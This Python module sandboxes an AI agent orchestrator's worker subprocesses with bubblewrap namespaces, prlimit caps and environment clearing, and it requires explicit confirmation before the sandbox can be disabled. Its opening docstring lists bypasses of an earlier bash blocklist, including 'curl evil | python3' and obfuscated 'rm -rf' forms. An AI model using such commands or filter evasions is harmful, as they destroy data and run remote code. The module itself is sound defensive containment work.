"""OS-level sandbox for worker subprocesses (FS7 round-3 — primary safety layer).

The legacy ``_scan_bash`` pattern-matcher in ``agent/safety/hooks.py`` is
fundamentally exhaustible: three rounds of fix-loops produced 5+5+5 new P0
bypasses each (``bash <<<``, ``(rm -rf x)``, ``{rm,-rf,x}``, ``xargs rm -rf``,
``curl evil | python3`` …). The blacklist approach loses the arms race.

This module replaces "primary safety = pattern match" with "primary safety =
OS-level isolation". A worker is run inside a `bwrap`(1) namespace + mount
sandbox so the bash inside it physically cannot reach the orchestrator's prod
files, regardless of how cleverly the shell is invoked. ``_scan_bash`` stays
as defence-in-depth (catches the known cases, logs suspicious) but is no
longer the safety floor.

Sandbox backends are pluggable via the :class:`Sandbox` Protocol. The default
factory :func:`detect_sandbox` picks ``bwrap`` if available, else
:class:`NoSandbox` with a loud audit-log warning.

Override via ``BMAD_SANDBOX=bwrap|none`` env (test fixtures, force-disable
scenarios).
"""

from __future__ import annotations

import logging
import os
import shutil
from dataclasses import dataclass
from pathlib import Path
from typing import Literal, Protocol, runtime_checkable

log = logging.getLogger(__name__)

NetworkPolicy = Literal["none", "github_only", "full"]

# Env var allow-list propagated into the sandbox. Mirrors
# ``runtime.worker_spawn.ALLOWED_WORKER_ENV`` plus per-call ORCHESTRATOR_*
# context the caller passes in ``env``. Keeping a separate constant here lets
# the sandbox stay decoupled from worker_spawn import (which itself imports
# from agent.tools, a circular risk).
_SANDBOX_DEFAULT_ENV_ALLOWLIST: frozenset[str] = frozenset({
    "PATH", "HOME", "USER", "LANG", "LC_ALL", "TZ", "PWD", "SHELL", "TERM",
})

# FS9 H3+H4 — defence-in-depth resource limits applied via ``prlimit(1)``
# wrapped around the bwrap invocation. bwrap itself has no native rlimit
# flags; a worker that escapes the mount/net sandbox but stays in-process
# can still fork-bomb the host or fill tmpfs without these caps. Defaults
# are conservative; override via env for tuning.
DEFAULT_MAX_NPROC = 512               # fork-bomb cap (per-uid process count)
DEFAULT_MAX_AS_BYTES = 8 * 1024**3    # virtual memory ceiling (8 GiB)
DEFAULT_MAX_FSIZE_BYTES = 10 * 1024**3  # max single-file size (10 GiB) — caps tmpfs spills
DEFAULT_MAX_NOFILE = 4096             # max open fds

# Env var override knobs (positive int → use; otherwise default).
_ENV_NPROC = "BMAD_SANDBOX_MAX_NPROC"
_ENV_AS = "BMAD_SANDBOX_MAX_AS_BYTES"
_ENV_FSIZE = "BMAD_SANDBOX_MAX_FSIZE_BYTES"
_ENV_NOFILE = "BMAD_SANDBOX_MAX_NOFILE"


def _env_positive_int(name: str, default: int) -> int:
    """Read ``name`` as positive int from env, fall back to ``default``."""
    raw = os.environ.get(name, "").strip()
    if raw.isdigit() and int(raw) > 0:
        return int(raw)
    return default


@runtime_checkable
class Sandbox(Protocol):
    """Pluggable OS-level isolation backend.

    Implementations wrap a command list with backend-specific isolation
    directives. The returned list is what the caller actually passes to
    ``asyncio.create_subprocess_exec`` / ``subprocess.Popen``.
    """

    @property
    def kind(self) -> str: ...

    def wrap_command(
        self,
        cmd: list[str],
        *,
        worktree: Path,
        readonly_paths: list[Path] | None = None,
        network: NetworkPolicy = "none",
        env: dict[str, str] | None = None,
    ) -> list[str]:
        """Return ``cmd`` wrapped with backend isolation flags.

        Args:
            cmd: argv of the inner process (``["claude", "-p", ...]``).
            worktree: writable mount root. Anything outside is read-only or
                hidden depending on backend.
            readonly_paths: extra paths to expose read-only (e.g. shared
                source for retros). Validated as absolute.
            network: ``"none"`` isolates the netns (default — safest);
                ``"full"`` shares host net; ``"github_only"`` is currently
                treated as ``"full"`` (nftables whitelist deferred per spec
                §5 "Out of scope").
            env: env vars to inject. Caller is responsible for already
                running them through their allow-list; sandbox only
                forwards.

        Returns:
            New argv list. ``NoSandbox`` returns ``cmd`` unchanged.
        """
        ...


@dataclass(frozen=True, slots=True)
class BwrapSandbox:
    """``bwrap``-backed sandbox (Bubblewrap, Flatpak's isolation primitive).

    Default policy:
      * ``--ro-bind / /`` — entire FS read-only.
      * ``--bind {worktree} {worktree}`` — worker can only write here.
      * ``--proc /proc``, ``--dev /dev`` — minimal proc/dev namespace.
      * ``--tmpfs /tmp`` — fresh empty tmpfs per invocation.
      * ``--tmpfs /sys`` — kernel info hidden (FS9 H1: LSM list, dmi, network
        topology otherwise readable via ``--ro-bind / /``).
      * ``--unshare-pid/uts/ipc/cgroup`` — namespace isolation.
      * ``--unshare-net`` iff ``network == "none"`` (default).
      * ``--die-with-parent`` — auto-cleanup if orchestrator dies.
      * ``--new-session`` — detach from controlling TTY.
      * ``--setenv K V`` per allow-listed env var; everything else stripped.

    The whole bwrap invocation is wrapped in ``prlimit(1)`` to enforce
    nproc / AS / fsize / nofile rlimits (FS9 H3+H4 — bwrap itself has no
    rlimit support).

    Read-only paths supplied via ``readonly_paths`` are additionally
    ``--ro-bind``ed. Useful for retros that read shared planning artifacts
    without granting write.
    """

    bwrap_path: str = "/usr/bin/bwrap"
    prlimit_path: str = "/usr/bin/prlimit"
    kind: str = "bwrap"

    def __post_init__(self) -> None:
        # FS9 H3+H4 — prlimit is a hard requirement; rlimits are the only
        # DoS defence inside the sandbox. Refuse to construct without it
        # rather than silently dropping resource caps.
        if not Path(self.prlimit_path).exists() and shutil.which("prlimit") is None:
            raise RuntimeError(
                f"prlimit not found at {self.prlimit_path!r} or on PATH; "
                "install util-linux (apt install util-linux) — required for "
                "sandbox resource limits."
            )

    def wrap_command(
        self,
        cmd: list[str],
        *,
        worktree: Path,
        readonly_paths: list[Path] | None = None,
        network: NetworkPolicy = "none",
        env: dict[str, str] | None = None,
    ) -> list[str]:
        if not cmd:
            raise ValueError("cmd must be non-empty")
        wt_abs = Path(worktree).resolve(strict=False)
        if not wt_abs.is_absolute():
            raise ValueError(f"worktree must be absolute: {worktree!r}")

        wrapped: list[str] = [
            self.bwrap_path,
            "--die-with-parent",
            "--new-session",
            "--ro-bind", "/", "/",
            "--proc", "/proc",
            "--dev", "/dev",
            "--tmpfs", "/tmp",  # noqa: S108 — bwrap mount point inside the sandbox namespace, not a host path
            "--tmpfs", "/sys",  # FS9 H1 — hide kernel info (LSMs, dmi, network)
            "--bind", str(wt_abs), str(wt_abs),
            "--chdir", str(wt_abs),
            "--unshare-pid",
            "--unshare-uts",
            "--unshare-ipc",
            "--unshare-cgroup-try",
        ]

        if network == "none":
            wrapped += ["--unshare-net"]
        # network="full" or "github_only" → share host netns (nftables
        # whitelist for github_only is deferred per spec §5).

        if readonly_paths:
            for p in readonly_paths:
                p_abs = Path(p).resolve(strict=False)
                if not p_abs.is_absolute():
                    raise ValueError(f"readonly_path must be absolute: {p!r}")
                wrapped += ["--ro-bind", str(p_abs), str(p_abs)]

        # Env propagation: clear ALL inherited env first, then forward only
        # the default allow-list + caller-provided ``env``. Without
        # ``--clearenv`` bwrap inherits the parent's env (incl.
        # ANTHROPIC_API_KEY etc), defeating the env-allowlist contract.
        wrapped += ["--clearenv"]
        merged_env: dict[str, str] = {
            k: os.environ[k]
            for k in _SANDBOX_DEFAULT_ENV_ALLOWLIST
            if k in os.environ
        }
        if env:
            merged_env.update(env)
        for k, v in merged_env.items():
            wrapped += ["--setenv", k, v]

        wrapped += ["--"]
        wrapped += list(cmd)

        # FS9 H3+H4 — prepend prlimit(1) outside the bwrap invocation so the
        # rlimits apply to the entire process tree (bwrap forks the inner
        # command; prlimit applies via setrlimit before exec, inherited by
        # all descendants).
        rlimit_wrapper = [
            self.prlimit_path,
            f"--nproc={_env_positive_int(_ENV_NPROC, DEFAULT_MAX_NPROC)}",
            f"--as={_env_positive_int(_ENV_AS, DEFAULT_MAX_AS_BYTES)}",
            f"--fsize={_env_positive_int(_ENV_FSIZE, DEFAULT_MAX_FSIZE_BYTES)}",
            f"--nofile={_env_positive_int(_ENV_NOFILE, DEFAULT_MAX_NOFILE)}",
            "--",
        ]
        return rlimit_wrapper + wrapped


@dataclass(frozen=True, slots=True)
class NoSandbox:
    """Fallback when no OS-level sandbox is available.

    ``wrap_command`` returns the command verbatim. On construction the
    factory logs a warning + emits an ``audit`` event so any prod
    deployment without ``bwrap`` is conspicuously flagged.
    """

    kind: str = "none"

    def wrap_command(
        self,
        cmd: list[str],
        *,
        worktree: Path,
        readonly_paths: list[Path] | None = None,
        network: NetworkPolicy = "none",
        env: dict[str, str] | None = None,
    ) -> list[str]:
        if not cmd:
            raise ValueError("cmd must be non-empty")
        return list(cmd)


def _emit_no_sandbox_audit(reason: str) -> None:
    """Best-effort audit event when falling back to NoSandbox. Failures here
    must not block worker spawn — audit is observability, not gating."""
    try:
        from bmad_orchestrator.agent.safety.audit import record_audit
        record_audit(
            "sandbox_unavailable",
            sandbox_kind="none",
            reason=reason,
            severity="warning",
        )
    except Exception as exc:
        log.warning("audit emit failed for sandbox fallback: %s", exc)


_DISABLE_CONFIRMATION_TOKEN = "yes-i-accept-risk"  # noqa: S105 — not a secret, public confirmation token


def _require_sandbox() -> bool:
    """``BMAD_REQUIRE_SANDBOX=1`` (or true/yes) → fail-loud on NoSandbox.

    Production launchers (systemd units) MUST set this so a missing bwrap
    binary blocks startup instead of silently degrading to no isolation.
    """
    return os.environ.get("BMAD_REQUIRE_SANDBOX", "").strip().lower() in {"1", "true", "yes"}


def _disable_confirmed() -> bool:
    """Two-key confirmation for ``BMAD_SANDBOX=none``.

    Operator must set ``BMAD_SANDBOX_DISABLE_CONFIRMED=yes-i-accept-risk`` in
    the same env as ``BMAD_SANDBOX=none``. Prevents a stray child process or
    a misconfigured systemd drop-in from disabling the sandbox unnoticed.
    """
    return os.environ.get("BMAD_SANDBOX_DISABLE_CONFIRMED", "").strip() == _DISABLE_CONFIRMATION_TOKEN


def _enforce_require_sandbox(result: Sandbox, *, reason: str) -> None:
    """Raise if BMAD_REQUIRE_SANDBOX=1 and ``result`` is not a real sandbox."""
    if _require_sandbox() and not isinstance(result, BwrapSandbox):
        raise RuntimeError(
            "BMAD_REQUIRE_SANDBOX=1 set but no sandbox backend available "
            f"(reason={reason}); refusing to spawn workers. Install bwrap "
            "(apt install bubblewrap) or unset BMAD_REQUIRE_SANDBOX."
        )


def detect_sandbox() -> Sandbox:
    """Pick the best sandbox backend available.

    Order:
      1. ``BMAD_SANDBOX`` env override (``bwrap`` | ``none``).
         - ``none`` requires ``BMAD_SANDBOX_DISABLE_CONFIRMED=yes-i-accept-risk``
           (FS9 H6); else raises RuntimeError.
      2. ``shutil.which("bwrap")`` → :class:`BwrapSandbox`.
      3. fallback → :class:`NoSandbox` (loud audit warning).

    FS9 H5: if ``BMAD_REQUIRE_SANDBOX=1`` is set and the resolved backend is
    not a real sandbox (i.e. NoSandbox), raise RuntimeError. Production
    deployments MUST set this env var in their systemd unit / launcher.
    """
    override = os.environ.get("BMAD_SANDBOX", "").strip().lower()
    if override == "none":
        if not _disable_confirmed():
            raise RuntimeError(
                "BMAD_SANDBOX=none requires BMAD_SANDBOX_DISABLE_CONFIRMED="
                f"{_DISABLE_CONFIRMATION_TOKEN}. Disabling sandbox in "
                "production is dangerous — set the confirmation env var or "
                "remove BMAD_SANDBOX=none."
            )
        # H5 takes precedence over H6 confirmation — REQUIRE wins over override.
        result: Sandbox = NoSandbox()
        _enforce_require_sandbox(result, reason="env_override_none_confirmed")
        log.warning("BMAD_SANDBOX=none confirmed — worker isolation DISABLED")
        _emit_no_sandbox_audit("env_override")
        return result
    if override == "bwrap":
        path = shutil.which("bwrap")
        if not path:
            log.error("BMAD_SANDBOX=bwrap but bwrap not found in PATH")
            fallback: Sandbox = NoSandbox()
            _enforce_require_sandbox(fallback, reason="bwrap_override_missing_binary")
            _emit_no_sandbox_audit("bwrap_override_missing_binary")
            return fallback
        return BwrapSandbox(bwrap_path=path)

    path = shutil.which("bwrap")
    if path:
        return BwrapSandbox(bwrap_path=path)

    log.error(
        "bwrap not found on PATH — falling back to NoSandbox. "
        "Worker subprocess isolation DISABLED. Install `bubblewrap` "
        "(apt install bubblewrap) to restore primary safety layer."
    )
    fallback = NoSandbox()
    _enforce_require_sandbox(fallback, reason="bwrap_not_installed")
    _emit_no_sandbox_audit("bwrap_not_installed")
    return fallback


__all__ = [
    "BwrapSandbox",
    "NetworkPolicy",
    "NoSandbox",
    "Sandbox",
    "detect_sandbox",
]
